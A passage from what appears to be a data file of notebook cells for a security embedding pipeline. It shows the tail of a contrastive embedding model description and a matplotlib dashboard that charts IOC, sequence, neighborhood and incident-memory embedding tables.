            "inter_class_similarity": float(np.mean(inter_class_sim)) if inter_class_sim else 0.0,
            "separation_gap": (
                float(np.mean(intra_class_sim) - np.mean(inter_class_sim))
                if intra_class_sim and inter_class_sim else 0.0
            ),
        }
'''

print("Security-Specific Contrastive Embedding Model defined")
print("  Components:")
print("    SecurityContrastiveLoss:     Multi-objective (technique + campaign + label)")
print("    SecurityEmbeddingAdapter:    Lightweight adapter with residual connection")
print("    SecurityEmbeddingTrainer:    Full training loop with cosine scheduling")
print()
print("  Training objectives:")
print("    1. Same MITRE technique     -> closer in embedding space")
print("    2. Same campaign            -> closer in embedding space")
print("    3. Malicious vs benign      -> margin separation")
print("    4. Kill-chain adjacency     -> moderate distance")
print()
print("  Evaluation:")
print("    Intra-class vs inter-class cosine similarity gap")`
    },
    {
      type: 'code',
      content: `# Cell 10: Observability & Validation Dashboard

import matplotlib.pyplot as plt

df_ioc = spark.table(f"{CATALOG}.{SCHEMA_VECTOR}.ioc_embeddings")
df_seq = spark.table(f"{CATALOG}.{SCHEMA_VECTOR}.sequence_embeddings")
df_nbr = spark.table(f"{CATALOG}.{SCHEMA_VECTOR}.neighborhood_embeddings")
df_inc = spark.table(f"{CATALOG}.{SCHEMA_VECTOR}.incident_memory")

fig, axes = plt.subplots(2, 3, figsize=(22, 12))
fig.suptitle("Vector & AI Memory Infrastructure - Validation Dashboard",
             fontsize=16, fontweight="bold")

ioc_types = df_ioc.groupBy("ioc_type").count().toPandas()
if len(ioc_types) > 0:
    colors = ["#0ea5e9", "#10b981", "#f59e0b", "#ef4444", "#3b82f6", "#6b7280", "#dc2626"]
    ioc_types.set_index("ioc_type")["count"].plot(
        kind="bar", ax=axes[0, 0], color=colors[:len(ioc_types)], edgecolor="#374151")
    axes[0, 0].tick_params(axis="x", rotation=45)
axes[0, 0].set_title("IOC Embeddings by Type", fontweight="bold")

seq_types = df_seq.groupBy("sequence_type").count().toPandas()
if len(seq_types) > 0:
    seq_types.set_index("sequence_type")["count"].plot(
        kind="bar", ax=axes[0, 1], color=["#2563eb", "#dc2626", "#10b981"], edgecolor="#374151")
axes[0, 1].set_title("Sequence Embeddings by Type", fontweight="bold")

if df_seq.count() > 0:
    labels = df_seq.groupBy("label").count().toPandas()
    mal_count = df_seq.filter(F.col("is_known_malicious") == True).count()
    ben_count = df_seq.filter(F.col("is_confirmed_benign") == True).count()
    axes[0, 2].pie(
        [mal_count, ben_count],
        labels=["Malicious", "Benign"],
        colors=["#ef4444", "#10b981"],
        autopct="%1.0f%%",
    )
axes[0, 2].set_title("Sequence Label Distribution", fontweight="bold")

if df_nbr.count() > 0:
    nbr_data = df_nbr.select("vertex_count", "edge_count").toPandas()
    axes[1, 0].scatter(nbr_data["vertex_count"], nbr_data["edge_count"],
                       c="#2563eb", alpha=0.6, edgecolors="#1e40af")
    axes[1, 0].set_xlabel("Vertices")
    axes[1, 0].set_ylabel("Edges")
axes[1, 0].set_title("Neighborhood Complexity", fontweight="bold")

if df_inc.count() > 0:
    inc_types = df_inc.groupBy("incident_type").count().toPandas()
    inc_types.set_index("incident_type")["count"].plot(
        kind="barh", ax=axes[1, 1], color="#0ea5e9", edgecolor="#0369a1")
axes[1, 1].set_title("Incident Memory by Type", fontweight="bold")

summary_data = [
    ["IOC Embeddings", f"{df_ioc.count():,}", "384-dim"],
    ["Sequence Embeddings", f"{df_seq.count():,}", "256-dim"],
    ["Neighborhood Embeddings", f"{df_nbr.count():,}", "128-dim"],
    ["Incident Memory", f"{df_inc.count():,}", "384-dim"],
    ["Vector Indexes", "3", "cosine"],
]
axes[1, 2].axis("off")
table = axes[1, 2].table(
    cellText=summary_data,
    colLabels=["Component", "Records", "Config"],
    cellLoc="left", loc="center",
)
table.auto_set_font_size(False)
table.set_fontsize(10)
table.scale(1.2, 1.5)
axes[1, 2].set_title("Infrastructure Summary", fontweight="bold")

plt.tight_layout()
plt.show()

print(f"""
Vector & AI Memory Infrastructure Summary:
  IOC Embeddings:          {df_ioc.count():>6,} records (384-dim, E5-base)
  Sequence Embeddings:     {df_seq.count():>6,} records (256-dim, LSTM encoder)
  Neighborhood Embeddings: {df_nbr.count():>6,} records (128-dim, structure2vec)
  Incident Memory:         {df_inc.count():>6,} records (384-dim, E5-base)
  Vector Indexes:          3 (semantic_ioc, behavioral_sequence, graph_neighborhood)
  Ray APIs:                3 (embed, retrieve, score)
""")`
    },
  ],
};
